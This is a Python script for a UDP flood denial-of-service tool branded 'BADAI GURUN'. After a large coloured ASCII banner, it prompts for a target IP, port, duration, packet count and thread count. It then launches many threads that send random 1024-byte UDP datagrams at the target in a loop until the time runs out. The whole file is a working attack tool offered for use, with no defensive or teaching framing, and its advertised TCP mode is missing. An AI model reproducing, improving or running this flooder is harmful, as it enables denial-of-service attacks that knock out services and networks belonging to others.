# _*_ coding: utf-8 _*_
import os
import sys
import socket
import threading
import time
import random


# Clear terminal screen
os.system("clear")

# Funcion to display header
def display_header():
    header_lines = (" ")
print("\033[1;30m═══════════════════════════════════════════════════════════\033[0m")
print("\033[1;34m\033[0m")
print("\033[1;32m█▒\033[1;33m═╗\033[1;32m  █▒\033[1;33m═╗\033[1;32m █▒\033[1;33m═╗\033[1;32m    █▒\033[1;33m═╗\033[1;32m ██▒\033[1;33m══╗\033[1;32m   █▒\033[1;33m═╗\033[1;32m ██████▒\033[1;33m═╗\033[1;32m █▒\033[1;33m═╗\033[1;32m       █▒\033[1;33m═╗\033[0m")
print("\033[1;32m█▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m  █▒\033[1;33m ║\033[1;32m    █▒\033[1;33m ║\033[1;32m █▒\033[1;32m █▒\033[1;33m ║\033[1;32m  █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ╔════╝\033[1;32m  █▒\033[1;33m ║\033[1;32m     █▒\033[1;33m ║\033[0m")
print("\033[1;32m█▒\033[1;33m ║\033[1;32m█▒\033[1;33m ║\033[1;32m   █▒\033[1;33m ║\033[1;32m    █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m█▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m        █▒\033[1;33m ║\033[1;32m   █▒\033[1;33m ║\033[0m")
print("\033[1;32m███▒\033[1;33m ║\033[1;32m     █▒\033[1;33m ║\033[1;32m    █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m█▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m          █▒\033[1;33m║\033[1;32m █▒\033[1;33m ║\033[0m")
print("\033[1;32m█▒\033[1;33m ║\033[1;32m█▒\033[1;33m ║\033[1;32m   █▒\033[1;33m ║\033[1;32m    █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m  █▒\033[1;32m █▒\033[1;33m ║\033[1;32m █████▒\033[1;33m═╗\033[1;32m       ██▒\033[1;33m ║\033[0m")
print("\033[1;32m█▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m  █▒\033[1;33m ║\033[1;32m    █▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m   █▒\033[1;32m█▒\033[1;33m ║\033[1;32m █▒\033[1;33m ╔═══╝\033[1;32m       █▒\033[1;33m ║\033[0m")
print("\033[1;32m█▒\033[1;33m ║\033[1;32m  █▒\033[1;33m ║\033[1;32m   █████▒\033[1;33m══╝\033[1;32m  █▒\033[1;33m ║\033[1;32m    ██▒\033[1;33m ║\033[1;32m █▒\033[1;33m ║\033[1;32m           █▒\033[1;33m ║\033[0m")
print("\033[1;33m╚══╝  ╚══╝  ╚═══════╝  ╚═══╝    ╚═══╝ ╚══╝           ╚══╝\033[0m")
print("\033[0;35m╔╗  ╔╗ ╔═══╗  ╔═══╗    ╔═══╗ ╔════╗╔════╗  ╔═══╗ ╔════╗ ╔╗  ╔\033[0m")
print("\033[0;35m║║  ║║ ║║   ║ ║║   ║  ║║   ║   ║║    ║║   ║║  ║  ║║     ║║═╝\033[0m")
print("\033[0;35m╚╝  ╚╝ ║║   ║ ╚╚══╝   ╔╔═══╗   ║║    ║║   ╔╔═══║ ║║     ║║═╗\033[0m")
print("\033[0;35m╚╚══╝  ╚╚══╝  ╚╝      ╚╝   ╚   ╚      ╚   ╚╝   ╚ ╚╚═══╝ ╚╝  ╚\033[0m")
print("\033[0;33m\033[0m")
print("\033[0;33m\033[0m")
print("\033[1;330m══════════════════════════════════════════════════════════\033[0m")

# Prompt user for input
def get_user_input():
    print("\033[1;35m+========================================================\033[0m")
    target_ip = input("\033[0;37m | Target IP : \033[1;32m").strip()
    target_port = input("\033[0;34m | Target Port : \033[1;33m").strip()
    attack_time = input("\033[0;36m | Time (seconds) : \033[0;33m").strip()
    packet = input("\033[0;33m | Packet : \033[0;36m").strip()
    thread_count = input("\033[1;33m | Thread : \033[0;34m").strip()
    method = input("\033[1;32m | Method (UDP/TCP & UDP Mix) : \033[0;37m").strip().lower()
    print("\033[1;35m=========================================================\033[0m")

    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method

# Display input summary after user provides inputs
def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
    display_header()  # Show the banner again
    print("+=======================================================+")
    print(f" \033[0;37m| Target IP : \033[1;32m{target_ip:<40}  |")
    print(f" \033[0;34m| Target Port : \033[1;33m{target_port:<40}|")
    print(f" \033[0;36m| Time : \033[0;33m{attack_time:<40}       |")
    print(f" \033[0;33m| Packet : \033[0;36m{packet:<45}|")
    print(f" \033[1;33m| Thread : \033[0;34m{thread_count:<45}|")
    print(f" \033[1;32m| Method (UDP/TCP & UDP Mix) : \033[0;37m{method:<25}|")
    print("=========================================================")

# UDP attack function
def udp_attack(ip, port, packet, duration, thread_count):
    timeout = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)

    while time.time() < timeout:
        try:
            for _ in range(packet):
                s.sendto(data, (ip, port))
            print(f"  \033[1;37m:: \033[1;30mBADAI GURUN \033[0;31m= \033[0;37mUDP\033[0;33m~\033[0;33mATTACK \033[0;31m▒▒\033[0;34m " +ip+ " \033[1;33m-- \033[0;35mrunning\033[0m")
            print(f"  \033[1;31m:: \033[1;33mBADAI GURUN \033[0;31m= \033[0;33mUDP\033[0;33m~\033[0;37mATTACK \033[1;37m▒▒\033[0;33m " +ip+ " \033[1;37m-- \033[1;31mrunning\033[0m")
        except socket.error:
            s.close()
            print(f"  \033[1;33m:: \033[0;36mBADAI GURUN \033[0;34mError during attack, socket closed.\033[0m")
            break

# Threaded attack function
def start_attack(target_ip, target_port, packet, thread_count, method, duration):
    if method == 'udp':
        for _ in range(thread_count):
            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
            th.start()
    else:
        print("[BADAI GURUN] Unsupported method. Only UDP supported in this version.")

# Main program flow
def main():
    display_header()  # Show the header initially
    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)

    # Start attack
    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[BADAI GURUN] Attack interrupted. Exiting...")
        sys.exit()
